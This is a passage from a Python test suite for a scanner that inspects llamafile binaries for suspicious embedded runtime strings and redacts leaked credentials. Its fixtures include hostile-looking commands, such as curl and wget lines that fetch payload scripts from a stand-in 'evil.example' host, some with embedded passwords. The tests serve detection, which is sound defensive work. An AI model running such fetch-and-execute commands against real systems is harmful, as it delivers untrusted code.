    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "command-near-match.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert runtime_checks
    assert all(check.severity == IssueSeverity.INFO for check in runtime_checks)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "curl --cacert cert.pem http://127.0.0.1/payload",
        "curl -w status.txt http://user:secret@localhost/payload",
        "wget -P output.dir http://127.0.0.1/payload",
        "curl --noproxy evil.example http://localhost/payload",
        "wget --referer https://ref.example http://localhost/payload",
        "curl -H 'Referer: https://ref.example' http://localhost/payload",
        "curl --connect-to localhost:80::80 http://localhost/payload",
        "curl --connect-to localhost:80:[::1]:80 http://localhost/payload",
        "curl --resolve localhost:80:[::1] http://localhost/payload",
    ],
)
def test_llamafile_scanner_does_not_correlate_local_transfer_targets(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "local-transfer.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "curl -u user:supersecret evil.example/payload.sh",
        "wget --user=user --password=supersecret evil.example/payload.sh",
        'curl --user "user:supersecret value" https://evil.example/payload.sh',
        r"curl -u user:supersecret\ value https://evil.example/payload.sh",
        "curl -uuser:supersecret https://evil.example/payload.sh",
        "curl --oauth2-bearer=supersecret https://evil.example/payload.sh",
    ],
)
def test_llamafile_scanner_redacts_transfer_option_credentials(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "remote-transfer-credentials.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
    details = repr(runtime_issues[0].details)
    assert "supersecret" not in details
    assert "<redacted>" in details


def test_llamafile_scanner_bounds_and_redacts_long_userinfo_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "long-userinfo.llamafile"
    secret = "supersecret" * 200
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"curl user:{secret}@evil.example/payload"]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
    details = repr(runtime_issues[0].details)
    assert "supersecret" not in details
    assert "<redacted>" in details


def test_llamafile_scanner_evidence_prefers_correlated_command_over_local_url(tmp_path: Path) -> None:
    binary = tmp_path / "evidence-anchor.llamafile"
    runtime_line = "http://localhost/ " + ("padding " * 180) + "bash -c curl http://evil.example/payload"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
    details = repr(runtime_issues[0].details)
    assert "curl" in details
    assert "evil.example" in details


def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
    binary = tmp_path / "mixed.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "llamafile curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -> None:
    binary = tmp_path / "safe-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


@pytest.mark.parametrize(
    "runtime_line",
    [
        (
            "error: APE is running on WIN32 inside WSL. You need to run: "
            "sudo sh -c 'echo -1 > /proc/sys/fs/binfmt_misc/WSLInterop'"
        ),
        "keywords: cpp curl cvpa wget where powershell processing",
        "If the server is reachable from curl or Node, use the client",
        "If the server is reachable from curl or Node, use the /v1/chat/completions endpoint",
        "The curl documentation is at docs/example.html",
        "keywords: curl user@example.com for support",
    ],
)
def test_llamafile_scanner_ignores_bundled_runtime_command_near_matches(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "runtime-command-near-match.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
    command_hits: set[str] = set()
    network_hits: set[str] = set()
    LlamafileScanner()._merge_oversized_runtime_command_hits(
        runtime_line.encode(),
        command_hits,
        network_hits,
    )
    assert command_hits == set()


def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
    binary = tmp_path / "mixed-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "%'18T connect(127.0.0.1:8080)",
        "%'18T connect(localhost)",
        "%'18T socket 127.0.0.1:8080",
        "%'18T socket 0.0.0.0:8080",
    ],
)
def test_llamafile_scanner_allows_local_endpoint_runtime_fragments(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "local-endpoint-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


@pytest.mark.parametrize(
    "runtime_line",
    [
        "INFO llama server listening on http://evil.example/payload.sh",
        "%'18T connect http://evil.example/payload.sh",
        "%'18T socket http://evil.example/payload.sh",
        "%'18T connect(evil.example:8080)",
        "%'18T socket evil.example:8080",
        "%'18T connect(10.0.0.8:8080)",
        "%'18T socket 192.168.1.10:8080",
        "%'18T connect(172.16.0.5:8080)",
    ],
)
def test_llamafile_scanner_flags_safe_fragments_with_remote_network_targets(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "remote-network-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [
        issue for issue in result.issues if "Executable runtime contains network indicators" in issue.message
    ]
    assert runtime_issues
    assert all(issue.severity == IssueSeverity.INFO for issue in runtime_issues)


def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
    binary = tmp_path / "truncated.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))

    result = LlamafileScanner().scan(str(binary))

    assert result.success
    assert any("No embedded GGUF payload marker found" in issue.message for issue in result.issues)


def test_llamafile_scanner_fails_closed_when_payload_scan_window_ends_before_gguf(tmp_path: Path) -> None:
    binary = tmp_path / "late-payload.llamafile"
    late_payload = b"\x00" * 1024 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=late_payload))

    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 256}).scan(str(binary))

    assert result.success is False
    assert result.metadata.get("analysis_incomplete") is True
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
    payload_checks = [check for check in result.checks if check.name == "Llamafile Embedded Payload Detection"]
    assert payload_checks
    assert payload_checks[0].message == "No embedded GGUF payload marker found before bounded scan window ended"
    assert payload_checks[0].details.get("analysis_incomplete") is True

    aggregate = scan_model_directory_or_file(
        str(binary),
        llamafile_payload_scan_bytes=256,
        cache_scan_results=False,
    )
    metadata = aggregate.file_metadata[str(binary)]
    assert aggregate.success is False
    assert metadata.get("scan_outcome") == "inconclusive"
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            llamafile_payload_scan_bytes=256,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]

        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == "inconclusive"
        assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_embedded_gguf_findings_include_location_mapping(tmp_path: Path) -> None:
    binary = tmp_path / "embedded.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    embedded_checks = [check for check in result.checks if check.name.startswith("Llamafile Embedded")]
    assert embedded_checks
    assert any((check.location or "").startswith("llamafile:") for check in embedded_checks)
